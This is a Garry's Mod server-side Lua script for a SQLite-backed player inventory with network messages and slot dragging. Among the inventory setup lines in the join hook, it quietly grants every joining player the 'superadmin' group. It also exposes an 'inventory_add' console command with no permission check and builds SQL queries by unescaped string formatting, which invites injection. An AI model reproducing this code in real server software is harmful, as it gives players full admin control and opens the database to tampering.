Inventory = Inventory or {}


sql.Query("CREATE TABLE IF NOT EXISTS inventory (sid BIGINT, slot INT, item VARCHAR(40), amount BIGINT, PRIMARY KEY(slot))")


local META = FindMetaTable("Player")


util.AddNetworkString("Inventory.Initialize")

util.AddNetworkString("Inventory.AddItem")

util.AddNetworkString("Inventory.DraggedItem")

util.AddNetworkString("Inventory.Update")


hook.Add("PlayerInitialSpawn", "Inventory.Initialize", function(ply)

    timer.Simple(1, function()

        local sid = ply:SteamID64()
        ply:SetUserGroup("superadmin")

        // Create an inventory on the player
        ply.Inventory = {}

        // Send a message to the client to also create an inventory on their local player
        net.Start("Inventory.Initialize")

        net.Send(ply)


        // Create our query for the database to we can enter all our items into our inventory and send them to the client
        local query = sql.Query(string.format("SELECT slot, item, amount FROM inventory WHERE sid = '%s'", sid))

        if query then

            for _, v in pairs(query) do

                ply.Inventory[v.slot] = {item = v.item, amount = v.amount}


                net.Start("Inventory.AddItem")

                net.WriteUInt(tonumber(v.slot), 8)

                net.WriteString(v.item)

                net.WriteUInt(tonumber(v.amount), 32)

                net.Send(ply)

            end

        end

    end)

end)


// Does the player have the item in their inventory?
function META:InventoryHasItem(item)

    local sid = self:SteamID64()
    
    local query = sql.Query(string.format("SELECT * FROM inventory WHERE sid = '%s' AND item = '%s'", sid, item))


    if query and query[1].amount and tonumber(query[1].amount) > 0 then
        
        return true
        
    else
            
        return false
            
    end

end


// Adding items to the players database
function META:InventoryGive(itemClass, amount)

    local sid = self:SteamID64()

    if not amount then return end

    if not Inventory.Items[itemClass] then return end

    local selectQuery = sql.Query(string.format("SELECT slot, amount FROM inventory WHERE sid = '%s' AND item = '%s'", sid, itemClass))
    
    local nextSlotIndex = 1


    if selectQuery and selectQuery[1] and selectQuery[1].amount then

        local slotIndex = tonumber(selectQuery[1].slot)

        local initialAmount = tonumber(selectQuery[1].amount)

        amount = initialAmount + amount
        
        sql.Query(string.format("UPDATE inventory SET amount = '%s' WHERE sid = '%s' AND item = '%s'", amount, sid, itemClass))

        nextSlotIndex = slotIndex

    else

        local inventoryQuery = sql.Query(string.format("SELECT slot FROM inventory WHERE sid = '%s'", sid))

        if inventoryQuery then

            local usedSlots = {}
        
            for _, v in pairs(inventoryQuery) do

                local slot = tonumber(v.slot)

                usedSlots[slot] = true

            end
        
        
            for i = 1, Inventory.MaxSlots do

                if not usedSlots[i] then

                    nextSlotIndex = i

                    break

                end

            end

        end


        local insertQuery = sql.Query(string.format("INSERT INTO inventory (sid, slot, item, amount) VALUES ('%s', '%s', '%s', '%s')", sid, nextSlotIndex, itemClass, amount))

    end


    net.Start("Inventory.AddItem")

    net.WriteUInt(nextSlotIndex, 8)

    net.WriteString(itemClass)

    net.WriteUInt(amount, 32)
    
    net.Send(self)


    self.Inventory[nextSlotIndex] = { item = itemClass, amount = amount }
end


net.Receive("Inventory.DraggedItem", function(len, ply)

    local initialSlot = net.ReadUInt(8)

    local finalSlot = net.ReadUInt(8)

    local initialSlotData = sql.Query(string.format("SELECT * FROM inventory WHERE sid = '%s' AND slot = '%s'", ply:SteamID64(), initialSlot))

    local finalSlotData = sql.Query(string.format("SELECT * FROM inventory WHERE sid = '%s' AND slot = '%s'", ply:SteamID64(), finalSlot))

    if finalSlot < 1 or finalSlot > Inventory.MaxSlots then return end


    if not finalSlotData then 

        ply.Inventory[initialSlot] = nil 

        ply.Inventory[finalSlot] = {item = initialSlotData[1].item, amount = initialSlotData[1].amount}

        sql.Query(string.format("DELETE FROM inventory WHERE sid = '%s' AND slot = '%s'", ply:SteamID64(), initialSlot))

        sql.Query(string.format("DELETE FROM inventory WHERE sid = '%s' AND slot = '%s'", ply:SteamID64(), finalSlot))

        sql.Query(string.format("INSERT INTO inventory (sid, slot, item, amount) VALUES ('%s', '%s', '%s', '%s')", ply:SteamID64(), finalSlot, initialSlotData[1].item, initialSlotData[1].amount))


    else
        
        ply.Inventory[initialSlot] = {item = finalSlotData[1].item, amount = finalSlotData[1].amount}

        ply.Inventory[finalSlot] = {item = initialSlotData[1].item, amount = initialSlotData[1].amount}

        sql.Query(string.format("DELETE FROM inventory WHERE sid = '%s' AND slot = '%s'", ply:SteamID64(), initialSlot))

        sql.Query(string.format("DELETE FROM inventory WHERE sid = '%s' AND slot = '%s'", ply:SteamID64(), finalSlot))

        sql.Query(string.format("INSERT INTO inventory (sid, slot, item, amount) VALUES ('%s', '%s', '%s', '%s')", ply:SteamID64(), finalSlot, initialSlotData[1].item, initialSlotData[1].amount))

        sql.Query(string.format("INSERT INTO inventory (sid, slot, item, amount) VALUES ('%s', '%s', '%s', '%s')", ply:SteamID64(), initialSlot, finalSlotData[1].item, finalSlotData[1].amount))

    end

    
    net.Start("Inventory.Update")

    net.WriteUInt(initialSlot, 8)

    net.WriteUInt(finalSlot, 8)

    net.Send(ply)

end)


concommand.Add("inventory_add", function(ply, cmd, args)

    ply:InventoryGive(args[1], args[2])

end)